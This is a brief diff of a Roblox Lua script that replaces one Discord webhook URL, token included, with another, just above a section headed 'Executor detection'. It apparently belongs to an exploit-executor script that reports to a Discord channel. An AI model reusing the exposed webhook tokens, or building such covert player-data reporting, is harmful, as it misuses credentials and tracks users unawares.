@@ -6,7 +6,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
 --// Webhook URL
-local webhook = "https://discord.com/api/webhooks/1374927459363061870/NVLNHOGR2aH0NmICgEATTZVDt5yBAuoyO3sn3QCWhxOweUjkWbuaVRZrTYscDTujYKoe"
+local webhook = "https://discord.com/api/webhooks/1476804979900809328/PFnQxXhMbGzVVCUD8jRslpxZbT9qFaAN8yAdoAWtNfz25DdL7858pXe9WxSP1UdPdxff"
 
 --// Executor detection
 local executor = "Unknown"
